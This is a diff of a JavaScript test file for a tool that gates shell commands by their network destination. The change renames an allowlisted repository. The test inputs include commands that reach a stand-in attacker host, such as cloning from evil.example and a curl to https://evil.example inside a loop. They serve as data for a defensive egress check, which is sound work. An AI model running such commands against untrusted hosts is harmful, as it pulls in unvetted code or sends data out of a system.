@@ -57,7 +57,7 @@ test('git remotes in scp form are destinations', () => {
   assert.deepEqual(shellEgressHosts('git clone git@evil.example:a/b.git'), ['evil.example']);
   gated(sh('git clone git@evil.example:a/b.git'));
   gated(sh('git clone evil.example:repo'));
-  allowed(sh('git clone git@github.com:askalf/redstamp.git'));
+  allowed(sh('git clone git@github.com:askalf/warden.git'));
   // A refspec or a Windows drive is not a host.
   assert.deepEqual(shellEgressHosts('git fetch https://github.com/a/b refs/heads/a:refs/heads/b'), ['github.com']);
   assert.deepEqual(shellEgressHosts('git clone C:/src/repo'), []);
@@ -130,7 +130,7 @@ test('a destination decided at run time cannot be vouched for by the allowlist',
   gated(sh('git clone -b main "$REPO"'));
   gated(sh('git clone --reference x "$REPO"'));
   gated(sh('git clone --depth=1 "$REPO"'));
-  allowed(sh('git clone --depth 1 https://github.com/askalf/redstamp.git'));
+  allowed(sh('git clone --depth 1 https://github.com/askalf/warden.git'));
   // A loop variable is rebound at run time: an earlier literal is not its value.
   gated(sh('u=https://api.example.com; for u in https://evil.example; do curl $u; done'));
   gated(sh('u=https://api.example.com; for u in $(cat hosts); do curl $u; done'));
